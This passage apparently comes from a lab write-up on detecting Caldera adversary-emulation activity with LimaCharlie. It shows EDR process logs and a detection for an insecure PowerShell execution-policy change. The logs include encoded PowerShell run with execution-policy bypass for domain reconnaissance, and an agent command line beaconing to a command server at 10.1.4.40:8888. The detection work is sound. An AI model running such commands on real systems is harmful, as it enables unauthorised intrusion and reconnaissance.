</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#f1fa8c>&#34;COMMAND_LINE&#34;</span>:<span style=color:#f1fa8c>&#34;powershell.exe -ExecutionPolicy Bypass -C &#34;</span>powershell -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4ARABuAHMAXQA6ADoARwBlAHQASABvAHMAdABCAHkATgBhAG0AZQAoACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIATgBhAG0AZQApAC4ASABvA…<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#f1fa8c>&#34;</span>FILE_IS_SIGNED<span style=color:#f1fa8c>&#34;:1
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#f1fa8c>&#34;</span>FILE_PATH<span style=color:#f1fa8c>&#34;:&#34;</span>C:\Windows\System32\WindowsPowerShell\v1.<span style=color:#bd93f9>0</span>\powershell.exe<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#f1fa8c>&#34;</span>HASH<span style=color:#f1fa8c>&#34;:&#34;</span>9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#f1fa8c>&#34;</span>MEMORY_USAGE<span style=color:#f1fa8c>&#34;:55050240
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#f1fa8c>	&#34;</span>PARENT<span style=color:#f1fa8c>&#34;:{
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#f1fa8c>		&#34;</span>BASE_ADDRESS<span style=color:#f1fa8c>&#34;:12845056
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#f1fa8c>		&#34;</span>COMMAND_LINE<span style=color:#f1fa8c>&#34;:&#34;&#34;C:\Users\Public\Client1.exe&#34;</span> -server http://<span style=color:#bd93f9>10.1</span>.4.<span style=color:#bd93f9>40</span>:<span style=color:#bd93f9>8888</span> -group red <span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#f1fa8c>		&#34;</span>FILE_IS_SIGNED<span style=color:#f1fa8c>&#34;:0
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#f1fa8c>		&#34;</span>FILE_PATH<span style=color:#f1fa8c>&#34;:&#34;</span>C:\Users\Public\Client1.exe<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#f1fa8c>		&#34;</span>HASH<span style=color:#f1fa8c>&#34;:&#34;</span>2cd247e11809af2d9dab77b3afb7c87977871309783372a14277b719fa27f6a7<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#f1fa8c>		&#34;</span>MEMORY_USAGE<span style=color:#f1fa8c>&#34;:1306624
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#f1fa8c>		&#34;</span>PARENT_ATOM<span style=color:#f1fa8c>&#34;:&#34;</span>a76b164d14483ef2a0016dab68de5e69<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#f1fa8c>		&#34;</span>PARENT_PROCESS_ID<span style=color:#f1fa8c>&#34;:9660
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#f1fa8c>		&#34;</span>PROCESS_ID<span style=color:#f1fa8c>&#34;:4272
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#f1fa8c>		&#34;</span>THIS_ATOM<span style=color:#f1fa8c>&#34;:&#34;</span>bbde0097323d5ef3b6dc604568de5e8c<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#f1fa8c>		&#34;</span>THREADS<span style=color:#f1fa8c>&#34;:1
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#f1fa8c>		&#34;</span>TIMESTAMP<span style=color:#f1fa8c>&#34;:1759403660323
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#f1fa8c>		&#34;</span>USER_NAME<span style=color:#f1fa8c>&#34;:&#34;</span>SSNRSHNN\goadmin<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#f1fa8c>}
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#f1fa8c>&#34;</span>PARENT_PROCESS_ID<span style=color:#f1fa8c>&#34;:4272
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#f1fa8c>&#34;</span>PROCESS_ID<span style=color:#f1fa8c>&#34;:5540
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span><span style=color:#f1fa8c>&#34;</span>THREADS<span style=color:#f1fa8c>&#34;:19
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span><span style=color:#f1fa8c>&#34;</span>USER_NAME<span style=color:#f1fa8c>&#34;:&#34;</span>SSNRSHNN\goadmin<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#f1fa8c>}
</span></span></span></code></pre></div><p><strong>Child process:</strong></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#f1fa8c>&#34;event&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#f1fa8c>&#34;BASE_ADDRESS&#34;</span>:<span style=color:#bd93f9>140695890034688</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#f1fa8c>&#34;COMMAND_LINE&#34;</span>:<span style=color:#f1fa8c>&#34;&#34;</span>C:\Windows\System32\WindowsPowerShell\v1.<span style=color:#bd93f9>0</span>\powershell.exe<span style=color:#f1fa8c>&#34; -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4ARABuAHMAXQA6ADoARwBlAHQASABvAHMAdABCAHkATgBhAG0AZQAoACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIATgBhAG0AZQApAC4…&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#f1fa8c>&#34;FILE_IS_SIGNED&#34;</span>:<span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#f1fa8c>&#34;FILE_PATH&#34;</span>:<span style=color:#f1fa8c>&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#f1fa8c>&#34;HASH&#34;</span>:<span style=color:#f1fa8c>&#34;9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#f1fa8c>&#34;MEMORY_USAGE&#34;</span>:<span style=color:#bd93f9>31219712</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span>	<span style=color:#f1fa8c>&#34;PARENT&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span>		<span style=color:#f1fa8c>&#34;BASE_ADDRESS&#34;</span>:<span style=color:#bd93f9>140695890034688</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span>		<span style=color:#f1fa8c>&#34;COMMAND_LINE&#34;</span>:<span style=color:#f1fa8c>&#34;powershell.exe -ExecutionPolicy Bypass -C &#34;</span>powershell -Enc WwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4ARABuAHMAXQA6ADoARwBlAHQASABvAHMAdABCAHkATgBhAG0AZQAoACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIATgBhAG0AZQApAC4ASABvA…<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#f1fa8c>		&#34;</span>FILE_IS_SIGNED<span style=color:#f1fa8c>&#34;:1
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#f1fa8c>		&#34;</span>FILE_PATH<span style=color:#f1fa8c>&#34;:&#34;</span>C:\Windows\System32\WindowsPowerShell\v1.<span style=color:#bd93f9>0</span>\powershell.exe<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#f1fa8c>		&#34;</span>HASH<span style=color:#f1fa8c>&#34;:&#34;</span>9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#f1fa8c>		&#34;</span>MEMORY_USAGE<span style=color:#f1fa8c>&#34;:55050240
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#f1fa8c>		&#34;</span>PARENT_ATOM<span style=color:#f1fa8c>&#34;:&#34;</span>bbde0097323d5ef3b6dc604568de5e8c<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#f1fa8c>		&#34;</span>PARENT_PROCESS_ID<span style=color:#f1fa8c>&#34;:4272
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#f1fa8c>		&#34;</span>PROCESS_ID<span style=color:#f1fa8c>&#34;:5540
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#f1fa8c>		&#34;</span>THIS_ATOM<span style=color:#f1fa8c>&#34;:&#34;</span>7af019fcf9ba0bb848cf51ac68de60ef<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#f1fa8c>		&#34;</span>THREADS<span style=color:#f1fa8c>&#34;:19
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#f1fa8c>		&#34;</span>TIMESTAMP<span style=color:#f1fa8c>&#34;:1759404270750
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#f1fa8c>		&#34;</span>USER_NAME<span style=color:#f1fa8c>&#34;:&#34;</span>SSNRSHNN\goadmin<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#f1fa8c>}
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#f1fa8c>&#34;</span>PARENT_PROCESS_ID<span style=color:#f1fa8c>&#34;:5540
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#f1fa8c>&#34;</span>PROCESS_ID<span style=color:#f1fa8c>&#34;:8360
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span><span style=color:#f1fa8c>&#34;</span>THREADS<span style=color:#f1fa8c>&#34;:17
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span><span style=color:#f1fa8c>&#34;</span>USER_NAME<span style=color:#f1fa8c>&#34;:&#34;</span>SSNRSHNN\goadmin<span style=color:#f1fa8c>&#34;
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#f1fa8c>}
</span></span></span></code></pre></div><p><strong>LimaCharlie Detection:</strong></p><p><img src=/images/calderacertutil/7.png alt=certutil></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1</span><span><span style=color:#f1fa8c>&#34;detection&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2</span><span><span style=color:#ff79c6>&#34;author&#34;</span>:<span style=color:#f1fa8c>&#34;_ext-sigma-7a14fbc3-54d9-4b4d-8700-61eddada04f0[bulk][segment]&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3</span><span><span style=color:#f1fa8c>&#34;cat&#34;</span>:<span style=color:#f1fa8c>&#34;Change PowerShell Policies to an Insecure Level&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4</span><span><span style=color:#f1fa8c>&#34;detect&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5</span><span><span style=color:#ff79c6>&#34;event&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6</span><span><span style=color:#ff79c6>&#34;BASE_ADDRESS&#34;</span>:<span style=color:#bd93f9>140695890034688</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7</span><span><span style=color:#f1fa8c>&#34;COMMAND_LINE&#34;</span>:<span style=color:#f1fa8c>&#34;powershell.exe -ExecutionPolicy Bypass -C &#34;</span>powershell -Enc SQBtAHAAbwByAHQALQBNAG<span style=color:#bd93f9>8</span>AZAB<span style=color:#bd93f9>1</span>AGwAZQAgAC<span style=color:#bd93f9>4</span>AXABwAG<span style=color:#bd93f9>8</span>AdwBlAHIAdgBpAGUAdwAuAHAAcwAxADsARwBlAHQALQBEAG<span style=color:#bd93f9>8</span>AbQBhAGkAbgBDAG<span style=color:#bd93f9>8</span>AbQBwAHUAdABlAHIA<span style=color:#f1fa8c>&#34;&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8</span><span><span style=color:#f1fa8c>&#34;FILE_IS_SIGNED&#34;</span>:<span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9</span><span><span style=color:#f1fa8c>&#34;FILE_PATH&#34;</span>:<span style=color:#f1fa8c>&#34;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10</span><span><span style=color:#f1fa8c>&#34;HASH&#34;</span>:<span style=color:#f1fa8c>&#34;9785001b0dcf755eddb8af294a373c0b87b2498660f724e76c4d53f9c217c7a3&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11</span><span><span style=color:#f1fa8c>&#34;MEMORY_USAGE&#34;</span>:<span style=color:#bd93f9>54919168</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12</span><span><span style=color:#f1fa8c>&#34;PARENT&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13</span><span><span style=color:#ff79c6>&#34;BASE_ADDRESS&#34;</span>:<span style=color:#bd93f9>12845056</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14</span><span><span style=color:#f1fa8c>&#34;COMMAND_LINE&#34;</span>:<span style=color:#f1fa8c>&#34;&#34;</span>C:\Users\Public\Client<span style=color:#bd93f9>1</span>.exe<span style=color:#f1fa8c>&#34; -server http://10.1.4.40:8888 -group red &#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15</span><span><span style=color:#f1fa8c>&#34;FILE_IS_SIGNED&#34;</span>:<span style=color:#bd93f9>0</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16</span><span><span style=color:#f1fa8c>&#34;FILE_PATH&#34;</span>:<span style=color:#f1fa8c>&#34;C:\Users\Public\Client1.exe&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17</span><span><span style=color:#f1fa8c>&#34;HASH&#34;</span>:<span style=color:#f1fa8c>&#34;2cd247e11809af2d9dab77b3afb7c87977871309783372a14277b719fa27f6a7&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18</span><span><span style=color:#f1fa8c>&#34;MEMORY_USAGE&#34;</span>:<span style=color:#bd93f9>1306624</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19</span><span><span style=color:#f1fa8c>&#34;PARENT_ATOM&#34;</span>:<span style=color:#f1fa8c>&#34;a76b164d14483ef2a0016dab68de5e69&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20</span><span><span style=color:#f1fa8c>&#34;PARENT_PROCESS_ID&#34;</span>:<span style=color:#bd93f9>9660</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21</span><span><span style=color:#f1fa8c>&#34;PROCESS_ID&#34;</span>:<span style=color:#bd93f9>4272</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22</span><span><span style=color:#f1fa8c>&#34;THIS_ATOM&#34;</span>:<span style=color:#f1fa8c>&#34;bbde0097323d5ef3b6dc604568de5e8c&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23</span><span><span style=color:#f1fa8c>&#34;THREADS&#34;</span>:<span style=color:#bd93f9>1</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24</span><span><span style=color:#f1fa8c>&#34;TIMESTAMP&#34;</span>:<span style=color:#bd93f9>1759403660323</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25</span><span><span style=color:#f1fa8c>&#34;USER_NAME&#34;</span>:<span style=color:#f1fa8c>&#34;SSNRSHNN\goadmin&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27</span><span><span style=color:#f1fa8c>&#34;PARENT_PROCESS_ID&#34;</span>:<span style=color:#bd93f9>4272</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28</span><span><span style=color:#f1fa8c>&#34;PROCESS_ID&#34;</span>:<span style=color:#bd93f9>10060</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29</span><span><span style=color:#f1fa8c>&#34;THREADS&#34;</span>:<span style=color:#bd93f9>19</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30</span><span><span style=color:#f1fa8c>&#34;USER_NAME&#34;</span>:<span style=color:#f1fa8c>&#34;SSNRSHNN\goadmin&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span><span style=color:#f1fa8c>&#34;routing&#34;</span>:{
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span><span style=color:#ff79c6>&#34;arch&#34;</span>:<span style=color:#bd93f9>2</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span><span style=color:#f1fa8c>&#34;did&#34;</span>:<span style=color:#f1fa8c>&#34;&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span><span style=color:#f1fa8c>&#34;event_id&#34;</span>:<span style=color:#f1fa8c>&#34;f23d4b05-3f27-45a1-b12d-34186e3a8197&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span><span style=color:#f1fa8c>&#34;event_time&#34;</span>:<span style=color:#bd93f9>1759404331906</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span><span style=color:#f1fa8c>&#34;event_type&#34;</span>:<span style=color:#f1fa8c>&#34;NEW_PROCESS&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span><span style=color:#f1fa8c>&#34;ext_ip&#34;</span>:<span style=color:#f1fa8c>&#34;79.238.92.208&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span><span style=color:#f1fa8c>&#34;hostname&#34;</span>:<span style=color:#f1fa8c>&#34;client1.ssnrshnn.local&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span><span style=color:#f1fa8c>&#34;iid&#34;</span>:<span style=color:#f1fa8c>&#34;9b03d810-e114-4352-9392-a1186feb7894&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span><span style=color:#f1fa8c>&#34;int_ip&#34;</span>:<span style=color:#f1fa8c>&#34;10.1.2.10&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42</span><span><span style=color:#f1fa8c>&#34;latency&#34;</span>:<span style=color:#bd93f9>-200</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43</span><span><span style=color:#f1fa8c>&#34;moduleid&#34;</span>:<span style=color:#bd93f9>2</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44</span><span><span style=color:#f1fa8c>&#34;oid&#34;</span>:<span style=color:#f1fa8c>&#34;c73795e0-a62c-4854-9462-be3d08769aa1&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45</span><span><span style=color:#f1fa8c>&#34;parent&#34;</span>:<span style=color:#f1fa8c>&#34;bbde0097323d5ef3b6dc604568de5e8c&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46</span><span><span style=color:#f1fa8c>&#34;plat&#34;</span>:<span style=color:#bd93f9>268435456</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">47</span><span><span style=color:#f1fa8c>&#34;sid&#34;</span>:<span style=color:#f1fa8c>&#34;23bf4a39-63f5-4808-8a3a-772460439fe4&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">48</span><span><span style=color:#f1fa8c>&#34;tags&#34;</span>:[
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">49</span><span><span style=color:#f1fa8c>&#34;windows&#34;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">50</span><span>]
